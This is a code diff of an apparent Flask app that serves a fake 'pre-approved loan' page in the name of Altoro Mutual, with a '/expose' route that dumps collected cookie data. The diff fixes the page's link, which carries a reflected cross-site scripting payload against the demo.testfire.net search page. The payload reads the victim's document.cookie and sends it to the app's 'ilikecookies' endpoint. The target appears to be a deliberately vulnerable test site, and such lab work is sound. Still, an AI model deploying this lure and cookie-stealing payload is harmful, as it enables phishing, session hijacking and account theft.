@@ -15,7 +15,7 @@ def heartbeat():
     return "I am alive"
 
 @app.route('/expose')
-def dumpdata():
+def expose():
     datafile = "/tmp/cookiedata.txt"
     if not os.path.isfile( datafile ):
         return "server contains no data :-("
@@ -57,7 +57,7 @@ def loanapproval():
             <h1>You are granted loan by Altoro mutual</h1> 
             <p> 
                 Your account has been granted an pre approved loan.
-                Please to continue further.<a href="%22http%3A%2F%2Fdemo.testfire.net%2Fsearch.jsp%3Fquery%3D%3D%3Cscript%3Evar%20xsession%3D%22%27%27%27%20%20%20request.url_root%20%20%20%27%27%27ilikecookies%3F%22.concat(document.cookie)%3B%20var%20xhttp%20%3D%20new%20XMLHttpRequest()%3B%20xhttp.open(%22GET%22%2C%20xsession%2C%20true)%3B%20xhttp.send()%3C%2Fscript%3E%22">click here</a>
+                Please to continue further.<a href="http://demo.testfire.net/search.jsp?query=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''ilikecookies%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here</a>
             </p> 
         </center> 
     </body> 
